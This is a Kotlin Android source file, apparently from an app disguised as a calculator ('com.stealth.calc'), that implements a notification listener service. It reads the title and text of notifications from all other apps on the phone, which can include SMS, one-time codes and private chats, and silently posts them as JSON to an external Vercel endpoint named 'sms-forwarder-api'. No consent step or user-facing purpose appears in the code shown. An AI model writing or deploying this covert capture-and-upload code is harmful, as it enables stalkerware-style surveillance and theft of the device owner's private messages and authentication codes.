package com.stealth.calc

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

class NotificationReceiverService : NotificationListenerService() {

    private val VERCEL_API_URL = "https://sms-forwarder-api.vercel.app/api/send"
    private val client = OkHttpClient()

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName

        // Do not forward system UI notifications or notifications from this app
        if (packageName == applicationContext.packageName ||
            packageName == "android" ||
            packageName == "com.android.systemui" ||
            packageName == "com.android.providers.downloads") {
            return
        }

        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        if (title.isNotEmpty() || text.isNotEmpty()) {
            val appName = getAppNameFromPackage(packageName)
            Log.d("NotificationReceiver", "Received notification from: $appName ($packageName)")
            Log.d("NotificationReceiver", "Title: $title | Text: $text")

            forwardNotification(appName, title, text)
        }
    }

    private fun getAppNameFromPackage(packageName: String): String {
        return try {
            val pm = packageManager
            val info = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(info).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun forwardNotification(appName: String, title: String, text: String) {
        val json = JSONObject()
        // Format sender as "AppName - Title" or just "AppName"
        val sender = if (title.isNotEmpty()) "$appName - $title" else appName
        json.put("sender", sender)
        json.put("message", text)

        val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())

        val request = Request.Builder()
            .url(VERCEL_API_URL)
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("NotificationReceiver", "Failed to forward notification", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d("NotificationReceiver", "Successfully forwarded notification to Vercel")
                } else {
                    Log.e("NotificationReceiver", "Server returned error: ${response.code}")
                }
                response.close()
            }
        })
    }
}
